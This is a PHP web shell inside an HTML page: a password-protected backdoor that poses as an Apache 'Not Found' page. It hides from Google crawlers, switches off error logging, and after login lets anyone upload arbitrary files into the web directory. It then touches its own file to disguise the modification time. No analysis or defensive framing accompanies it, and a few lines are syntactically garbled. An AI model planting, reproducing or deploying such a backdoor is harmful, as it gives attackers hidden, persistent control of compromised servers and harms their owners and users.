<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-utf-8">
<title></title>
</head>
<body>
<?php

$wvvmby = "auth_pass";  ://pass:1337
$ {
    $wvvmby
} = "e48e13207341b6bffb7fb1622282247b";
$color = "#82C0FF";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('display_errors',0);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', 'Ver 2.0');
if( get_magic_quotes_gpc() ) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}
function printLogin() {
    echo '<link rel="shotcut icon"href="http://forum.curvefever.com/sites/default/files/ideas12Nov/skul.jpg" />
		  <h1>Not Found</h1>
          <p>The requested URL was not found on this server.</p>
          <hr>
          <address>Apache Server at '.$_SERVER['HTTP_HOST'].' Port 80</address>
          <style>input { margin:0;background-color:#fff;border:1px solid #fff; }</style>
          <center><form method=post><input type=password name=pass></form></center>';
    exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
    if( empty( $auth_pass ) ||
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        printLogin();

if( strtolower( substr(PHP_OS,0,3) ) == "win" )
    $os = 'win';
else
    $os = 'nix';

print "<h1></h1>\n";
echo "Your IP: ";
echo $_SERVER['REMOTE_ADDR'];
echo "<form method=\"post\" enctype=\"multipart/form-data\">\n";
echo "<input type=\"file\" name=\"filename\"><br> \n";
echo "<input type=\"submit\" value=\"LOAD\"><br>\n";
echo "</form>\n";
if(is_uploaded_file/*;*/($_FILES["filename"]["tmp_name"]))
	{
	move_uploaded_file/*;*/($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
	$file = $_FILES/*;*/["filename"]["name"];
	echo "<a href=\"$file\">$file</a>";
	} else {
	echo("empty");
	}
$filename = $_SERVER[SCRIPT_FILENAME];
touch/*;*/($filename, $time);
?>
</body>
